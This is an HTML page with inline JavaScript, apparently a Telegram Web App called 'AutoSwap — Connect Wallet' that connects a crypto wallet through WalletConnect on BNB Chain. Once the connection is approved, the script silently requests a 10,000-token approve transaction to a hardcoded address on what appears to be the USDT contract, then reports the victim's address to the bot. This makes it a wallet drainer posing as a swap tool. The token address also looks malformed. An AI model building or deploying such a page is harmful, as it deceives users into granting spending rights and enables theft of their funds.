<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>AutoSwap ‚Äî Connect Wallet</title>
  <style>
    body { background:#000; color:#e0e0e0; font-family:'Segoe UI',sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
    .container { width:360px; padding:30px; background:#111; border-radius:12px; box-shadow:0 0 20px rgba(0,0,0,0.7); text-align:center; }
    h1 { color:#4fc3f7; margin-bottom:20px; }
    canvas { background:#222; border-radius:8px; margin:auto; display:block; }
    #manual-uri { margin:20px auto; padding:16px; background:#222; border-radius:8px; font-size:14px; color:#bbb; word-break:break-all; }
    #status { margin:20px 0; min-height:40px; font-size:16px; color:#ccc; }
    .btn { padding:12px 24px; background:#4fc3f7; color:#000; border:none; border-radius:8px; cursor:pointer; font-weight:bold; transition:background .2s; }
    .btn:hover { background:#67ccff; }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîÑ AutoSwap ‚Äî Connect Wallet</h1>
    <canvas id="qrcode" width="240" height="240"></canvas>
    <div id="manual-uri">URI –±—É–¥–µ—Ç –∑–¥–µ—Å—å</div>
    <div id="status">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
    <button id="reconnect" class="btn">üîÅ –ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è</button>
  </div>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <script type="module">
    import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
    import { Interface, parseUnits, getAddress } from 'https://esm.sh/ethers@6.14.3';

    const tg = window.Telegram?.WebApp; if (tg) tg.ready();

    const qr = document.getElementById("qrcode");
    const uriEl = document.getElementById("manual-uri");
    const statusEl = document.getElementById("status");
    const reconnectBtn = document.getElementById("reconnect");
    let client, session;

    reconnectBtn.onclick = () => init(true);

    function setStatus(msg, color="#ccc") {
      statusEl.textContent = msg;
      statusEl.style.color = color;
    }

    function clearUI() {
      uriEl.textContent = "";
      qr.getContext("2d").clearRect(0, 0, qr.width, qr.height);
      setStatus("");
      session = null;
    }

    async function connectWallet() {
      setStatus("üì∑ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è QR‚Äë–∫–æ–¥–∞‚Ä¶","#4fc3f7");
      const { uri, approval } = await client.connect({
        requiredNamespaces: { eip155: { chains:["eip155:56"], methods:["eth_sendTransaction"], events:["chainChanged","accountsChanged"] } }
      });
      QRCode.toCanvas(qr, uri, { width:240, margin:1 });
      uriEl.textContent = uri;

      session = await approval();
      const address = session.namespaces.eip155.accounts[0].split(":")[2];
      setStatus(`‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: ${address}`, "#66bb6a");
      await doApprove(address);
    }

    async function doApprove(address) {
      setStatus("üöÄ –û—Ç–ø—Ä–∞–≤–∫–∞ approve...", "#4fc3f7");
      const data = new Interface(["function approve(address,uint256)"]).encodeFunctionData("approve", [
        getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE"),
        parseUnits("10000",18)
      ]);
      try {
        const tx = await client.request({
          topic: session.topic,
          chainId: "eip155:56",
          request: { method:"eth_sendTransaction", params:[{ from: address, to:getAddress("0x55d398326f99059ff775246999027b3197955"), data }] }
        });
        setStatus(`‚úÖ Approve tx: ${tx}`, "#66bb6a");
        if (tg) tg.sendData(JSON.stringify({ address }));
      } catch(e) {
        console.error(e);
        setStatus(`‚ùå –û—à–∏–±–∫–∞: ${e.message||e.reason}`, "#ff6b6b");
      }
    }

    async function init(force=false) {
      if (force && session) {
        await client.disconnect({ topic: session.topic, reason:{ code:6000, message:"User reconnected" }});
      }
      clearUI();
      setStatus("üîå –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è‚Ä¶");

      client = await SignClient.init({
        projectId: "d868f90cd734355ae0328f8f0258b6b1",
        relayUrl: "wss://relay.walletconnect.com",
        metadata:{ name:"AutoSwap", description:"Approve USDT via WalletConnect", url:location.href, icons:["https://walletconnect.com/favicon.ico"] }
      });

      const existing = await client.session.getAll();
      if (existing.length && !force) {
        session = existing[0];
        const address = session.namespaces.eip155.accounts[0].split(":")[2];
        setStatus(`‚Ñπ –°–µ—Å—Å–∏—è –∞–∫—Ç–∏–≤–Ω–∞: ${address}. –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.`, "#ffa500");
      } else {
        await connectWallet();
      }

      client.on("session_delete", () => {
        clearUI();
        setStatus("‚ö†Ô∏è –°–µ—Å—Å–∏—è —É–¥–∞–ª–µ–Ω–∞", "#ffa500");
      });
    }

    init();
  </script>
</body>
</html>
